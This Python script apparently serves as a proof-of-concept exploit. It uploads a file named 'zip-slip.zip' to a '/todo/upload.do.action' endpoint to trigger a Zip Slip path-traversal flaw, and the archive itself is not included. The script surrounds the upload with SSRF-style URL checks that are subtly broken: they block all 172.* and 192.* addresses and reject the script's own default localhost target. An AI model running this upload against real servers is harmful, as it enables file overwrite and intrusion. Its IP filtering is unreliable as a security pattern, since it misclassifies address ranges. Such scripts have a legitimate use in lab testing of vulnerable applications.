import requests
import os
import sys
import socket
from urllib.parse import urlparse, urljoin

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ["http", "https"], result.netloc])
    except ValueError:
        return False

def is_allowed_domain(url, allowed_domains):
    try:
        result = urlparse(url)
        netloc = result.netloc.split(':')[0]  # Get the domain or IP without port
        return netloc in allowed_domains and not is_ip_address(netloc)
    except ValueError:
        return False

def is_ip_address(domain):
    try:
        ip = socket.gethostbyname(domain)
        # Block private, loopback, or link-local addresses to avoid SSRF attacks
        if ip.startswith(('10.', '172.', '192.', '127.', '169.254.')):
            return True
        return False
    except socket.error:
        return False

# Block private and local IP addresses from use in final URLs
def is_allowed_url(url, allowed_domains):
    parsed_url = urlparse(url)
    netloc = parsed_url.netloc.split(':')[0]
    
    # Check domain or if it's an IP address
    if is_ip_address(netloc):
        return False
    
    # Final URL should still be within allowed domains
    if not is_allowed_domain(url, allowed_domains):
        return False
    
    return True

malicious_zip = os.path.join(os.path.dirname(__file__), 'zip-slip.zip')
input_url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080'
url = urljoin(input_url, '/todo/upload.do.action')

# Validate base URL
if not is_valid_url(input_url):
    print("Invalid base URL provided")
    sys.exit(1)

# Define allowed domains
allowed_domains = ['localhost', 'example.com']

# Check if the base URL domain is allowed
if not is_allowed_domain(input_url, allowed_domains):
    print("Base domain not allowed")
    sys.exit(1)

# Ensure final URL after joining the path is still within allowed domains
if not is_allowed_url(url, allowed_domains):
    print("Final URL domain not allowed or IP address detected")
    sys.exit(1)

# Disallow redirects to prevent SSRF exploits
session = requests.Session()
session.max_redirects = 0  # Prevent following redirects

# Make the request with a timeout to prevent hanging
try:
    with open(malicious_zip, 'rb') as file:
        files = {'upload': ('zip-slip.zip', file, 'application/zip')}
        response = session.post(url, files=files, timeout=10, allow_redirects=False)
        response.raise_for_status()
except requests.exceptions.TooManyRedirects:
    print("Redirects not allowed")
except requests.RequestException as e:
    print(f"Request failed: {e}")
finally:
    session.close()  # Close session
